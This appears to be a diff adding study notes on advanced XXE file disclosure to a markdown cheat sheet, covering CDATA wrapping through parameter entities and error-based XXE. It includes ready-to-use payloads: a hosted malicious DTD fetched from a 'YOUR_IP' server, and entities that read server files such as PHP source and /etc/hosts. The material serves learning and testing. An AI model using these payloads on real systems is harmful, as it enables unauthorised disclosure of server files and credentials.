@@ -908,3 +908,83 @@ Overloads the parser with recursive entities.
 > Can crash vulnerable XML parsers, though most modern ones block it.
 
 ---
+
+# 🛠️ Advanced File Disclosure via XXE
+
+## 📌 Background
+
+* Some web apps may not output file content directly via standard XXE.
+* Advanced techniques are used to bypass these limitations and extract sensitive data (including binary).
+
+
+## 🔐 CDATA Wrapping for Safe Output
+
+### ✅ Why CDATA?
+
+* XML parsers treat content inside `<![CDATA[ ... ]]>` as **raw text**, so special characters don’t break XML parsing.
+
+### ❌ Limitation:
+
+* XML does **not** allow combining **internal** and **external** entities.
+
+### ✅ Workaround: **Parameter Entities**
+
+* Parameter entities start with `%`.
+* Can be combined freely if all are **external**.
+
+### 📄 Example Workflow:
+
+#### 1. Host DTD File (e.g., `xxe.dtd`)
+
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+
+#### 2. Send Malicious XML Payload:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  %xxe;
+]>
+<email>&joined;</email>
+```
+
+* Result: Server parses the external file wrapped in CDATA → prints safe, unbroken file content.
+
+## 🚨 Error-Based XXE
+
+### 🧩 Scenario:
+
+* Web app does **not display** XML input/output.
+* But it **displays errors** (e.g., missing entity errors).
+
+### 🛠 Method:
+
+1. Trigger an error by referencing a non-existent entity.
+2. Combine this with an existing file reference → file content leaks via the error.
+
+#### 📄 DTD Payload (`xxe.dtd`)
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+#### 🔧 XML Payload:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+* Result: Error includes the contents of `/etc/hosts` in the path.
+
+---
